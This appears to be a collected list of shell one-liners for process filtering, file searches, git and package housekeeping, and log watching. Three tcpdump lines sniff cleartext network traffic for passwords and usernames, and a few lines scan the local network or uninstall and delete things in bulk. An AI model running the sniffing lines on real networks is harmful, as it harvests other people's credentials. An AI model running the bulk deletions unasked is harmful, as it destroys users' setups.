ps -ef|${E_GREP} -v '/usr/lib/saf/sac|/usr/lib/saf/ttymon|/usr/lib/utmpd|/usr/sbin/syslogd|/usr/cluster/lib/sc/failfastd|/usr/sbin/cron|zsched|/usr/lib/nfs/nfsmapid|/usr/lib/nfs/nfs4cbd|/usr/lib/inet/inetd|/sbin/init|/usr/lib/ldap/ldap_cachemgr|/usr/sbin/rpcbind|/usr/lib/ssh/sshd|/usr/lib/sendmail|/usr/lib/saf/ttymon|/usr/lib/autofs/automountd|/usr/sbin/nscd|/usr/lib/nfs/lockd|/usr/lib/crypto/kcfd|/usr/lib/nfs/statd|/usr/lib/krb5/ktkt_warnd|/usr/lib/autofs/automountd|/usr/cluster/lib/sc/pmmd|/lib/svc/bin/svc.startd|/lib/svc/bin/svc.configd|/usr/cluster/lib/sc/rpc.pmfd|/usr/bin/login|ps -ef|-bash|0:00 -sh|/usr/cluster/lib/|/usr/cluster/bin/cl|/usr/bin/bash|/usr/local/ecbmon/|[.*]|grep '
pstree -p | grep -v 'amarok\|akon\|Google\|dbus\|gvfs\|gconf\|kde\|chrome\|kio\|klaun\|kpat\|ksms\|tracker\|zeit\|ck-lau\|kgpb\|klipp\|kmix\|knoti\|kglob\|ktorr\|kuiser\|kwalle\|plasma\|pulse\|wine\|rsibre\|mysql\|nacl\|kactivi\|kwin\|kwrapp\|krunn\|gvim' | grep -v '^$'
"echo """"; echo ""+----------------------+""; echo ""| user | group | other |""; echo ""| rwx | rwx | rwx |""; echo ""| ||| | ||| | ||| |""; echo ""| 421 | 421 | 421 |""; echo ""| + | + | + |""; echo ""| 7 | 7 | 7 |""; echo ""+----------------------+""; echo """";"
"printf ""%b\n"" ""\n$(tput setaf 10)¬ / ~ / !\t$(tput setaf 11)|$(tput setaf 9)\t\tNOT$(tput sgr0)"" ""$(tput setaf 10)∧\t\t$(tput setaf 11)|$(tput setaf 9)\t\tAND$(tput sgr0)"" ""$(tput setaf 10)∨\t\t$(tput setaf 11)|$(tput setaf 9)\t\tOR$(tput sgr0)"" ""$(tput setaf 10)⊕\t\t$(tput setaf 11)|$(tput setaf 9)\t\tXOR$(tput sgr0)"" ""$(tput setaf 10)∈\t\t$(tput setaf 11)|$(tput setaf 9)\t\tIN$(tput sgr0)"" ""$(tput setaf 10)→ / ⇒ / ⊃\t$(tput setaf 11)|$(tput setaf 9)\t\tIF$(tput sgr0)"" ""$(tput setaf 10)↔ / ⇔ / ≡\t$(tput setaf 11)|$(tput setaf 9)\t\tIF AND ONLY IF$(tput sgr0)"" ""$(tput setaf 10)∃\t\t$(tput setaf 11)|$(tput setaf 9)\t\tAT LEAST ONE$(tput sgr0)"" ""$(tput setaf 10)∃!\t\t$(tput setaf 11)|$(tput setaf 9)\t\tEXACTLY ONE$(tput sgr0)"" ""$(tput setaf 10)∀\t\t$(tput setaf 11)|$(tput setaf 9)\t\tFOR ALL$(tput sgr0)"" ""$(tput setaf 10)≔ / ≡\t\t$(tput setaf 11)|$(tput setaf 9)\t\tDEFINED AS$(tput sgr0)"" ""$(tput setaf 10)⊤\t\t$(tput setaf 11)|$(tput setaf 9)\t\tTAUTAULOGY$(tput sgr0)"" ""$(tput setaf 10)⊥\t\t$(tput setaf 11)|$(tput setaf 9)\t\tCONTRADICTION$(tput sgr0)"" ""$(tput setaf 10)⊢\t\t$(tput setaf 11)|$(tput setaf 9)\t\tPROVABLE FROM$(tput sgr0)"" ""$(tput setaf 10)⊨\t\t$(tput setaf 11)|$(tput setaf 9)\t\tENTAILS$(tput sgr0)"" ""$(tput setaf 10):⇔\t\t$(tput setaf 11)|$(tput setaf 9)\t\tLOGICALLY EQUVALENT EVERYWHERE$(tput sgr0)"" && echo && printf ""%s"" ""¬ / ~ / ! | ∧ | ∨ | ⊕ | ∈ | → / ⇒ / ⊃ | ↔ / ⇔ | ∃ | ∃ | ∀ | ≔ / ≡ | ⊤ | ⊥ | ⊢ | ⊨ | :⇔ "" | tee >(xsel -ib) && echo"
gem list | grep -Ev '(bigdecimal|cmath|csv|date|dbm|did_you_mean|etc|fcntl|fiddle|fileutils|gdbm|io-console|ipaddr|json|minitest|net-telnet|openssl|power_assert|psych|rake|rdoc|scanf|sdbm|stringio|strscan|test-unit|webrick|xmlrpc|zlib)' | cut -d' ' -f1 | xargs gem uninstall -aIx
env | sort | egrep -v '^(COLORFGBG|COMMAND_MODE|DISPLAY|GREP_COLOR|GREP_OPTIONS|HOME|IRBRC|ITERM_PROFILE|ITERM_SESSION_ID|LANG|LC_CTYPE|LOGNAME|LSCOLORS|OLDPWD|PAGER|PATH|PWD|SHELL|SHLVL|SSH_AGENT_PID|SSH_AUTH_SOCK|TERM|TERM_PROGRAM|TMPDIR|USER|GEM_HOME|GEM_PATH|MY_RUBY_HOME|RUBY_VERSION)=' | egrep '^[A-Z]+[_=]'
arp-scan -l |sed 's/www.nta-monitor.com\/tools\/arp-scan\/)/\n/g' | sed 's/10.42.1.10\t/jaR0\t/g' | sed 's/10.42.1.100\t/RT\t/g' | sed 's/10.42.1.11\t/Landar0x\t/g' | sed 's/10.42.1.12\t/Knoppix\t/g' | sed 's/10.42.1.13\t/m4k\t/g' | sed 's/10.42.1.14\t/muS1x\t/g' | sed 's/10.42.1.15\t/q5vi\t/g' | sed 's/10.42.1.16\t/R3d\t/g' | sed 's/10.42.1.17\t/xXx\t/g' | sed 's/10.42.1.18\t/f3dor\t/g' | sed 's/10.42.1.19\t/Matriux\t/g' | sed 's/10.42.1.20\t/BOX\t/g' | sed 's/10.42.1.21\t/tru30s\t/g' | sed 's/10.42.1.22\t/Spike\t/g' | sed 's/10.42.1.23\t/wifislax\t/g' | sed 's/10.42.1.25\t/w1ns3rv\t/g' | sed 's/10.42.1.27\t/bugtraq\t/g' | sed 's/10.42.1.28\t/n3th\t/g' | sed 's/10.42.1.29\t/pentoo\t/g' | sed 's/10.42.1.30\t/BOX\t/g' | sed 's/10.42.1.33\t/Ka0s\t/g' | sed 's/10.42.1.34\t/nSTool\t/g' | sed 's/10.42.1.31\t/fr33bsd\t/g' | sed 's/10.42.1.26\t/srv8e\t/g' | sed 's/10.42.1.24\t/LiGhT\t/g' | sed 's/10.42.1.32\t/parrot\t/g'| sed 's/10.42.1.35\t/minino\t/g'| sed 's/10.42.1.37\t/p3nt00\t/g' | sed 's/10.42.1.39\t/p17\t/g'
"find | egrep ""\.(ade|adp|bat|chm|cmd|com|cpl|dll|exe|hta|ins|isp|jse|lib|mde|msc|msp|mst|pif|scr|sct|shb|sys|vb|vbe|vbs|vxd|wsc|wsf|wsh)$"""
"reset; npm start | h -ni ""failed|error|errors|module not found|resolver"" ""http|https|node_modules"" ""@|starting|watching|connecting|running|updating|compiling|compile|>|executing"" ""localhost|port|connected|open"" ""3000"" ""\.js|\.css|index"" ""/apolloClient|\./|~/|src/|components/|apollo-client/|apolloClient/|$HOME"
ag --color-line-number '1;36' --color-path '1;36' --ignore-case --print-long-lines --silent '(?:<!-- *)?(?:#|//|/\*+|<!--|--) *(TODO|FIXME|FIX|BUG|UGLY|HACK|NOTE|IDEA|REVIEW|DEBUG|OPTIMIZE)(?:\([^(]+\))?:?(?!\w)(?: *-->| *\*/|(?= *(?:[^:]//|/\*+|<!--|@|--))|((?: +[^\n@]*?)(?= *(?:[^:]//|/\*+|<!--|@|--))|(?: +[^@\n]+)?))'
"reset; npm run server | h -ni ""failed|error|warning"" ""http|https"" ""@|starting|watching|connecting|running|updating|compiling|compile|>|executing"" ""localhost|port|connected|open"" ""module not found|\./|~/|src/|components/|apollo-client/|apolloClient/"" ""\.js|\.css|index"" $HOME"
"/usr/signiant/dds/bin/perl/bin/perl -MFile::Find=find -MFile::Spec::Functions -Tlwe 'find { wanted => sub { print canonpath $_ if /\.pm\z/ }, no_chdir => 1 }, @INC' | sed 's|/usr/ddsperl/lib/||' | sed 's|site_perl/||' | sed 's|5.8.0/||' | sed 's|x86_64-linux-thread-multi/||' | sed 's|/|::|g' | sed 's|.pm$||'"
"mount | grep -v -E ""cgmfs|tmpfs|udev|none|rpc_pipefs|binfmt|fusectl|nfsd|cgroup|tmpfs|pstore|mqueue|debugfs|hugetlbfs|cgmfs|gvfsd-fuse|securityfs|devpts|udev|sysfs|proc|vmware-vmblock"" | column -t"
npm config ls -l | grep 'userconfig\|loglevel\|init-module\|cache\s\|^prefix\|shell\|node\-version\|globalignorefile\|globalconfig\|editor\|color' | rev | cut -d';' -f1 | rev | trim; npm config list | grep 'HOME\|cwd\|bin' | rev | cut -d';' -f1 | rev | trim
"tree -a -I '*~|*.png|*.jpg|*.jpeg|*.gif|*.bmp|*.ps|*.pdf|*.tar.gz|*.tgz|*.zip|*.rar|*.rar|.git|.gitkeep|.idea|.redcar|bin|bundler_stubs|tmp|*.swp|*.pyc|'"""
"adb logcat | grep ""Lookout : \["" | egrep -v BooleanGate\|BatterySensor\|InvestigationMetricTracker\|dalvik-cache\|FirmwareInvestigator\|PaperDelivery\|NewsroomService\|AppScanListener\|SecurityDB\|ZipAnomalyDetected\|HasAssessment\|ScanMetricsListener\|ZipFileInputStream\|FilesystemScanManagerScanner\|ResourceDataTable\|ScannableManifest\|ContainsPattern\|INotify.startMonitoring\|LocalScanner\|BaseApkScanner\|Id3TagValidationHeuristic"
perl -ne'print if /^[^#]*(?<!\\$)\b(sub|if|elsif|else|for|foreach|while|unless|until|do|next|last|redo|continue|given|when|goto|return|die|try|catch|return)\b/'
"sed -e ""s|ü|\&uuml;|g"" -e ""s|Ü|\&Uuml;|g"" -e ""s|ä|\&auml;|g"" -e ""s|Ä|\&Auml;|g"" -e ""s|ö|\&ouml;|g"" -e ""s|Ö|\&Ouml;|g"" -e ""s|ß|\&szlig;|g"""
"say_cat_2"" >> ~/.bashrc && printf '%s\n%s\n' ""function say_cat_2() { echo $' _\n | \\n | |\n | |\n |\ | |\n /, ~\ / /\n X \`-.....-------./ /\n ~-. ~ ~ |\n \ / |\n \ /_ ___\ /\n | /\ ~~~~~ \ |\n | | \ || |\n | |\ \ || )\n (_/ (_/ ((_/\n\n'}"" ""alias cat=say_cat_2"" >> ~/.zshrc"
"ps aux | ack ""[^a-zA-Z0-9_\/\$\.]ruby[^_a-zA-Z\/0-9\.\$]|passenger|rake|rack|rspec|spork|thin|puma|zeus|webrick|gem[^0-9a-zA-Z_\.]|minitest|capistrano|rbenv|rails|pry|irb|rerun|guard"" | awk ""{print \$2}"" | xargs kill -9; spring stop"
"foreach VAR in $(env | cut -d""="" -f1 | grep -v ""PATH\|TERM_SESSION_ID\|SSH_AUTH_SOCK\|Apple_PubSub_Socket_Render\|COLORFGBG\|ITERM_PROFILE\|XPC_FLAGS\|LANG\|SHELL\|TERM*\|PWD\|DISPLAY\|HOME\|TMPDIR\|USER\|XPC_SERVICE_NAME\|LOGNAME\|__CF_USER_TEXT_ENCODING\|SHLVL"" | sed -e ""$ d""); unset $VAR; end; source ""${HOME}/.zshrc"""
"service --status-all 2>&1 | egrep ""(apache2|apparmor|memcached|mysql|nginx|postfix|proftpd|ssh|varnish|zabbix-agent)$""|sed -e ""s|\+|${GREEN}+${NORMAL}|g"" -e ""s|-|${RED}-${NORMAL}|"" -e ""s|\?|${YELLOW}?${NORMAL}|g"""
"journalctl -b-0 | grep -i -v 'xylitol kernel: RAS: Correctable Errors collector initialized.\|xylitol tor\|xylitol kernel: nvidia: module verification failed: signature and/or required key missing - tainting kernel\|ACPI Warning: SystemIO range\|xylitol kernel: DMAR-IR: Queued invalidation will be enabled to support x2apic and Intr-remapping.\|xylitol kernel: ehci-pci 0000:00:1a.0: cache line size of 64 is not supported\|xylitol kernel: xhci_hcd 0000:00:14.0: cache line size of 64 is not supported\|xylitol kernel: ehci-pci 0000:00:1d.0: cache line size of 64 is not supported\|xylitol kernel: iTCO_wdt: unable to reset NO_REBOOT flag, device disabled by hardware/BIOS\|xylitol colord' | grep -i 'warn\|error\|fail\|critical\|fatal\|already\|??\|unable\|invalid\|not supported'"
"grep -v ""^ls$\|^lt$\|^ll$\|^l$\|^dir$\|^cd \|^h$\|^gh$\|^h \|^bg$\|^fg$\|^qsm$\|^quser$\|^cStat\|^note \|^mutt\|^std\|^jobs\|^less\|^emacs"" | wc -l"
"sudo lostfiles strict | egrep -vi ""/etc/systemd/user/sockets.target.wants|/etc/systemd/user/default.target.wants|/usr/local/bin|/usr/share/(themes|icons|hplip|fonts|cinnamon|backgrounds|docky|mime|pixmaps|\.mono|nginx|agave)|/var/(default|cache)|/usr/lib/python3\.8|-disabled"""
"ps aux | ack ""ruby|rails|pry|irb|rack|guard|zeus|rerun|gem[^0-9a-zA-Z_]|rbenv|rake|rspec|minitest|capistrano|thin|puma"" | awk ""{print \$2}"" | xargs kill -9"
"find . -regex "".*\(aux\|bbl\|blg\|brf|\idx\|ilg\|ind\|lof\|log\|lol\|lot\|out\|nav\|out\|snm\|tdo\|toc\|fls\|fdb_latexmk\)$"" -exec rm -i {} \;"
"echo -n ""Your Stallman Freedom index is "" && echo ""scale=2;"" $( pacman -Qi | grep -e ""^Lizenzen"" | grep -cE ""Artistic-2.0|PerlArtistic|Apache|Boost|GPL|BSD|MIT|WTFPL|MPL|Python|RUBY|W3C|ZLIB|ZPL|ISC"" ) \* 100 / $( pacman -Qi | grep -c ""Name"" ) | bc -l"
sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
sudo tcpdump -n -A -s0 port http or port ftp or port smtp or port imap or port pop3 | grep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
p | egrep -v '(chromium|firefox|zsh|cinnamon|ssh-agent|kdeinit|dbus-launch|avahi-daemon|syndaemon|nemo|nm-applet|sshd|tmux|urxvt|\/usr\/|\/lib\/|\/sbin\/)'
"deluge-console info | hh hh ""Name:|ID:|State:|Down Speed:|Up Speed:|ETA:|Seeds:|Size:|Ratio:|Peers:|Availability:|Seed time:|Active:|Tracker status:|Progress:"" ""KiB|MiB|GiB"" ""#"" ""~"" ""[0-9]{1,3}\.[0-9]{2}%"""
git grep -Ei '(cancer|fuck|shit|cunt|cuck|whore|bastard|bitch|damn|dick|skunk|shrimp|r\.i\.p|/rip/)' $(git rev-list --all) | cut -d ':' -f 3 | sort | uniq
"tree -a -I '*~|*.png|*.jpg|*.jpeg|*.gif|*.bmp|*.ps|*.pdf|*.tar.gz|*.tgz|*.zip|*.rar|*.rar|.git|.idea|*.swp|*.pyc'"""
"prettier --write --no-semi '{,!(dist|public|.cache|.serverless|.webpack)/**/}*.+(js|jsx|ts|tsx|json|yml|yaml|md|html|css|less|scss|graphql)'"
"hi | cut -c 1-7 --complement | sort | uniq | egrep -v ""^git|^fin|^vi|^which|^python|^rm|^ping|^alias|^cat|^cd|^cp|^lt"" | vi -"
"find . -type f \! -regex "".*\.\(jpg\|ico\|bmp\|jpeg\|png\|svg\|psd\|swf\|z\|tar\|zip\|bz2\|7z\|gz\|tgz\|phar\|jar\)"" \! -path ""*svn*"" \! -path ""*.git/*"""
"find . -type f \! -regex "".*\.\(jpg\|ico\|bmp\|jpeg\|png\|svg\|psd\|swf\|z\|tar\|zip\|bz2\|7z\|gz\|tgz\|phar\|jar\)"" \! -path ""*svn*"" \! -path ""*.git/*"" -exec todos {} \;"
"find . -type f \! -regex "".*\.\(jpg\|ico\|bmp\|jpeg\|png\|svg\|psd\|swf\|z\|tar\|zip\|bz2\|7z\|gz\|tgz\|phar\|jar\)"" \! -path ""*svn*"" \! -path ""*.git/*"" -exec fromdos {} \;"
git ls-tree --name-only -z -r HEAD|egrep -z -Z -E '\.(cc|h|cpp|hpp|c|txt|html|js|css|xml)$'|xargs -0 -n1 git blame --line-porcelain|grep '^author '|sort|uniq -c|sort -nr
find -regex '.*\(\.o\|\.d\|\.swp\|\.lit\|\.lst\|\.or32\|\.depend\|\.layout\|tags\|filenametags\|cscope\.out\|cscope.input\|obj\|map\.txt\|output\)' | xargs rm -rf
"vim -c ""nnoremap n h|nnoremap e j|nnoremap u k|nnoremap i l|nnoremap l i|nnoremap h n|nnoremap k u|nnoremap j e|vnoremap n h|vnoremap e j|vnoremap u k|vnoremap i l|vnoremap l i|vnoremap h n|vnoremap k u|vnoremap j e"""
"pidcat | grep -vE ""PackageBroadcastService|Settings|Launcher.Model|Finsky|GmsNetworkLocationProvi|Icing|UpdateIcingCorporaServi|Backup|GCoreNlp|ResourcesManager|OpenGLRenderer|EGL_emulation|PhoneStatusBar|Atlas|DefContainer"""
"grep /vob | sed -e ""s=.*\(/vob[s]*/\(\(linuxjava\|cdma\|cwag\|gccsc\|jem\|linuxjava\|linuxjava_test\|mm\|simtech\|tdma_tool\|testtech\|tetra\|util\)/\)\?[a-zA-Z0-9_\-]*\).*=\1="" | sort | uniq"
tree --ignore-case -CI '.build|.git|.venv|*.xcodeproj|bower_components|build|external|Carthage|CMakeFiles|CMakeScripts|node_modules|Pods|target|vendor|venv'
mount | grep -E '(minix|ext|reiser|xfs|jfs|xia|msdos|fat|ntfs|iso|smb|nfs|sysv|tmpfs)' --color=never
fping -a -g $(/sbin/ifconfig `/sbin/route -n | grep 'UG ' | head -n1 | awk {'print $8'}` | grep -i 'inet' | cut -f'2' -d':' | cut -f'1' -d' ' | cut -f'1-3' -d'.').1 $(/sbin/ifconfig `/sbin/route -n | grep 'UG '| head -n1 | awk {'print $8'}` | grep -i 'inet' | cut -f'2' -d':' | cut -f'1' -d' ' | cut -f'1-3' -d'.').254 2>/dev/null
\rm (*.(ms|mt|pa|tr|ic|st|ac|ma|el|sw)[0-9]##|\#*|*~|*log|*.sig|scope.log*)
"ps aux | ack ""ruby|rails|guard|rake|rack|puma|passenger|rbenv|irb|pry|bundler|rerun|rspec|zeus"""
"grep -iE ""ebay|chase|webscr|hotmail|yahoo|gmail|google|remax|fidelity|santander|visa|amazon|paypal|mastercard|signin"" /etc/userdomains"
"find . -maxdepth 1 -regextype gnu-awk -regex ""^.*\.(pyc|pyo|bak|swp|aux|log|nav|out|snm|toc|bcf|run\.xml|synctex\.gz|blg|bbl)"" -delete"
sed -i~ -e '/^\(?\|=\+$\|unchanged:\|diff\|only\|Only\|Tylko\|Binary files\|Files\|Common\|index \|Index:\|RCS file\|retrieving\)/d'
find -regextype posix-extended -regex '.*\.(orig|aux|nav|out|snm|toc|tmp|tns|pyg|vrb|fls|fdb_latexmk|blg|bbl)' -delete
"sudo launchctl list | sed 1d | awk ""!/0x|com\.(apple|openssh|vix)|edu\.mit|org\.(amavis|apache|cups|isc|ntp|postfix|x)/{print $3}"""
"ps aux | grep ""tsc\|node\|webpack\|nvm\|npm\|gulp\|grunt\|cordova\|express\|commander"" | grep -v ""grep.*\(\(tsc.*node.*\)\|\(node.*tsc\)\)*"" | xargs kill -9; pm2 stop all"
"mkdir -p ~/movies_to_delete && find -E . -type f -iregex "".*/*\.(mkv|avi|mov|mpg)$"" -mindepth 2 -print0 | xargs -0 -I{} dirname {} | xargs -I{} find -E {} -maxdepth 1 -iregex "".*/*\.(rar|zip)$"" -print0 | xargs -0 -I{} dirname {} | xargs -I{} find -E {} -maxdepth 1 -iregex "".*/*\.(mkv|avi|mov|mpg)$"" | grep -v sample | xargs -I{} mv {} ~/movies_to_delete"
"grep ""\""/"" /root/cptestm/strace.cpsrvd | cut -d""\"""" -f2 | egrep -v ""000|<|---|::|.pm$|.pmc$|.so(.?)*$|.bs$|\.py$|\.pyc"" | uniq | less -I"
"git status --porcelain | grep -E ""^(\?\?|(A|\s|M)M|R.*\s\->)\s"" | sed ""s/\(??\|\(A\|\s\|M\|M\)M\|R\.\*\s->\)\s//g"" | head -1 | xargs git diff"
"git st | grep -v ""\.php\|\.txt\|\.gif\|\.png\|\.css\|\.js\|\.jpg\|\.gitignore\|\.xml\|\.html\|\.ico\|\.config\|\.snp"""
"find . -regex "".*\.\(vb\|cs\|asax\|aspx\|ashx\|ascx\|resx\|sql\|config\|cshtml\|html\|js\|py\)"" -type f -print0 | xargs -0 grep --color=always -n -i "
"${triplet}g++ -std=c++17`[ -z ${triplet} ] && echo ' -march=native'` `LANG=C command ${triplet}g++ -fsyntax-only -Q --help=warnings,^joined,^separate,common --help=warnings,^joined,^separate,c++ | grep -v '\[enabled\]\|-Wabi\|-Waggregate-return\|-Wchkp\|-Wc90-c99-compat\|-Wpadded\|-Wsystem-headers\|-Wtraditional[^-]\|-Wnamespaces\|-Wtemplates' | grep -oe '-W[[:graph:]]\+' | sed -e 's/<[0-9,]\+>//' | xargs echo`"
tmux capture-pane -p -S -3000 > $HOME/tmux-buffer; tac $HOME/tmux-buffer | grep '.' | grep -v ' \\$ ' | grep -v ' \\\$\$' | grep -v ^' 'nscharmb | pe >$HOME/tmux-buffer ; cat -n $HOME/tmux-buffer | sort -uk2 | sort -nk1 | cut -f2- > $HOME/tmux-buffer; cat $HOME/tmux-buffer | ag --nobreak --nonumbers --noheading . | fzf --height 20% | xargs echo -n | read a ; tmux_helper
tmux capture-pane -p -S -3000 > $HOME/step_1.txt; tac $HOME/step_1.txt | grep '.' > $HOME/step_2.txt; cat $HOME/step_2.txt | grep -v ' \\$ ' > $HOME/step_3.txt; cat $HOME/step_3.txt | grep -v ' \\\$\$' > $HOME/step_4.txt; cat $HOME/step_4.txt | grep -v ^' 'nscharmb > $HOME/step_5.txt; cat $HOME/step_5.txt | pe >$HOME/tmux-buffer ; cat -n $HOME/tmux-buffer > $HOME/step_6.txt; cat $HOME/step_6.txt | sort -uk2 > $HOME/step_7.txt; cat $HOME/step_7.txt | sort -nk1 > $HOME/step_8.txt; cat $HOME/step_8.txt | cut -f2- > $HOME/tmux-buffer; cat $HOME/tmux-buffer > $HOME/step_9.txt; cat $HOME/step_9.txt | ag --nobreak --nonumbers --noheading . > $HOME/step_10.txt; cat $HOME/step_10.txt | fzf --height 20% > $HOME/step_11.txt; cat $HOME/step_11.txt | xargs echo -n > $HOME/step_12.txt; cat $HOME/step_12.txt | read a ; tmux_helper
p | egrep -v '(ssh-agent|-bash$|/System/Library|/usr/libexec|/usr/sbin|SafeEjectGPUAgent|Google Chrome|/Applications/Slack.app|Applications/iTerm.app|Applications/Postman.app|Applications/Firefox.app|com\.docker\.)'
git status -s | egrep '((UU)|([M|A][M|A])|( [M|A])|([M|A] ))|(\s?[M|A|U])\s?' | cut -c 4-
git remote -v | grep -o -m 1 '[@].*[.]' | sed 's|:|\/| ; s|@|http://www.| ; s|.$||' | xargs open
cat /dev/urandom | tr -dc 'a-zA-Z0-9-_!@#$%^&*()_+{}|:?=' | fold -w 8 | grep '[!@#$%^&*()_+{}|:?=]' | head -n 1; cat /dev/urandom | tr -dc 'a-zA-Z0-9-_!@#$%^&*()_+{}|:?=' | fold -w 32 | grep '[!@#$%^&*()_+{}|:?=]' | head -n 1
apg -a0 -m40 | tr 'z' 'D' | tr 'Z' '4' | tr 'y' 'H' | tr 'Y' 'R' | tr 'I' 'B' | tr 'l' '8' | tr 'I' 'X' | tr '1' 'M' | tr '0' 'U' | tr 'O' 'p' | tr 'J' 'q' | tr 'i' 'F'
"ssh -i ~/culver_keys.pem ec2-user@$(elastic-beanstalk-describe-environments -a venice-test --no-header | grep Green | cut -f 7 -d ""|"" | xargs -I {} elastic-beanstalk-describe-environment-resources -E {} --no-header | head -n1 | cut -f 3 -d ""|"" | tr "","" ""\n"" | head -n1 | xargs ec2-describe-instances | grep INSTANCE | cut -f 4 )"
"ssh -i ~/culver_keys.pem ec2-user@$(elastic-beanstalk-describe-environments -a venice-sandbox --no-header | grep Green | cut -f 7 -d ""|"" | xargs -I {} elastic-beanstalk-describe-environment-resources -E {} --no-header | head -n1 | cut -f 3 -d ""|"" | tr "","" ""\n"" | head -n1 | xargs ec2-describe-instances | grep INSTANCE | cut -f 4 )"
"ssh -i ~/culver_keys.pem ec2-user@$(elastic-beanstalk-describe-environments -a venice-production --no-header | grep Green | cut -f 7 -d ""|"" | xargs -I {} elastic-beanstalk-describe-environment-resources -E {} --no-header | head -n1 | cut -f 3 -d ""|"" | tr "","" ""\n"" | head -n1 | xargs ec2-describe-instances | grep INSTANCE | cut -f 4 )"
"rg ""TODO|INCOMPLETE|HACK|XXX|TBD|FIXME|REVIEW|REFACTOR|REMOVE|BUG|DEBUG|BUG|NOTE"" ."
"pip3 freeze | egrep -iv ""backcall|jedi|ipython|decorator|traitlets|prompt-toolkit|pygments|pickleshare|colorama|parso"" | sed ""s/==/>=/"" | dos2unix"
"pip uninstall -y $(pip freeze | egrep -v ""(^-e|appdirs|distribute|pip|pyparsing|setuptools|six|wheel|wsgiref)"" | grep -v ""^-f"" | sed ""s/>/=/g"" | cut -f1 -d=)"
"history | ack -v "" lsa"" | ack -v "" ls"" | ack -v ""history"" | ack -v ""cat "" | ack -v "" cd "" | ack -v ""bashrc"" | ack -v ""( ruby)|( rake)"" | ack -v ""pwd"" | ack -v ""searchfn"" | ack -v ""rbash"" | ack -v ""bundler"""
"egrep -i ""^\+\+\+|print|XXX|TODO|debug|wtf|dumpObject|console\.log|console\.time|console\.timeEnd|console\.debug|console\.dir"" | egrep -v ""^-"""
"chkconfig --list|egrep -i ""aud|cloud|iptab|virt|dnsm|mysq|network|nscd|ntp|nfs|bind|tomc"""
"cat package.json | ack ""react|redux|recompose|jsdom|reselect|normalizr|enzyme|jest|updeep|reduce-reducers|mobx"" | trim"
"cat /var/log/pacman.log | grep -i ""ed linux\|mware\|twork\|dkms ins\|a-nm\|nm-c\|ufw\|dhc\|wpa"" | grep -v ""head\|nvidia"" | tail -n 30"
"=squeue -u $(whoami) -o ""%i|%u|%30j|%t|%M|%R|node:%D|cpu:%c|%b"" | column -s ""|"" -t | sort -n -k 1 | colorline"
svn st | egrep '^(M|A)' | egrep '\.(h|m|strings|phtml|sql|php|sh)$' | awk '{print \$2}' | xargs -n 1 svn propset svn:keywords \
sed -E -e 's/[0-9][0-9]:[0-9][0-9]:[0-9][0-9]\.[0-9][0-9][0-9]/##:##:##.###/g' -e 's/[0-9][0-9]:[0-9][0-9]:[0-9][0-9]/##:##:##/g' -e 's/[0-3][0-9]-(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)-20[0-9][0-9]/##-MMM-20##/g'
nvim *.(c|cpp|h|hpp) || nvim *.(sh|bash|zsh) || nvim err.txt generated.file || nvim err.txt generated.file
fzf --preview '[[ $(file --mime {}) =~ binary ]] && echo {} is a binary file || (bat --style=numbers --color=always {} || highlight -O ansi -l {} || coderay {} || rougify {} || cat {}) 2> /dev/null | head -500'
find . -name '*pm' -print | grep -v _Test.pm | xargs egrep '^\s*(require|use)\b' | grep -v constant | cut -d: -f2- | sed 's/^[ \t]*//' | sed 's/ qw.*$/;/g' | perl -ne'print unless /use [a-z]/' | sort | uniq -c | sort -rn
1563502,313916,net,netstat -ant | egrep '9000|9001|9002|9003|9004|9005|61616|2011|8161|50021' | grep LISTEN"""
"{ sensors | tail -5| head -4 | cut -d\( -f1 | tail -4|cut -d+ -f2 | tr -d ""\n""; echo; ; sensors | head -6 | tail -1 | cut -d\( -f1 | cut -d+ -f2 | tr -d ""\n""; echo; }"
"ps aux | grep java | grep -E -o ""/[a-z]*/deploy"" | uniq | sort | sed -e ""s|/deploy||"" -e ""s|/||"""
"pidstat -t | egrep --color=always ""(squid|icap|http|redis|logstash|ssl_crtd|CPU|ss-local|watch_sso|watch_socks|ssh\b)"""
"netstat -an | egrep -v ""127.0.0|10.16|^udp|^unix|LISTEN|^Proto|Active"" | awk ""{print \$6}"" | sort | uniq -c | sort -nr"
"gitbranch=`gb | grep ""^*"" | cut -d"" "" -f2`; gco `git reflog | grep ""checkout: moving from"" | grep -ve ""from \(develop\|release\|master\|[0-9a-f]\{40\}\|$gitbranch\)"" | cut -d "" "" -f6 | uniq | head -n 1`"
"git branch --merged | egrep -v ""(^\*|master|develop|stage)"" | xargs git branch -d && git branch -r --merged | grep -v ""(^\*|master|develop|stage)"" | sed ""s/origin\///"" | xargs -n 1 git push --delete origin"
"find $PWD -name ""*.[cChsS]"" -o -name ""*.cpp"" | grep -v ""build\|RPMBUILD\|build_rhelx64\|build_winx64\|build_winx86\|build_aix\|hicapi-devel-01.0.8\|hicapi-01.0.8\|build_rhelx86\|external/hiarrayinf/include/hiStor/"" > cscope.files; cscope -b -q; ctags -L cscope.files; CSCOPE_DB=$PWD\/cscope.out; export CSCOPE_DB; CSCOPE_EDITOR=vim; export CSCOPE_EDITOR; echo ""CSCOPE ENV now is as follows-""; env | grep CSCOPE"
"clear; tail -n 0 -f /var/log/UiSessionMonitor /wsp/www_data/ui/app/tmp/logs/debug.log /var/log/apache2/wsp-error.log /wsp/www_data/ui/app/tmp/logs/error.log /var/log/postgresql/postgresql-9.4-wingcon.log | grep -E -v -e ""is_bdr|should_be_even|table_changed|information_schema|table_schema|pg_stat_activity|pg_settings|pg_type|search_path|character_maximum_length|DISTINCT column_name"""
"adb logcat | grep -iE ""(omnistore|mqtt|InitialFetcher|E/AndroidRuntime|MLiteUncaughtExceptionHandler|Delta|mlite|translator|E/StrictMode|dalvikvm|syncprotocol)"""
"=squeue -o ""%i|%u|%30j|%t|%M|%R|node:%D|cpu:%c|%b"" | column -s ""|"" -t | colorline"
"(ps -ef | head -n 1; ps -ef | grep -E -e ""(celery|uwsgi|nginx|python)"" | grep -v ""(celery|uwsgi|nginx|python)"" | sort -k8 | cut -c1-250)"
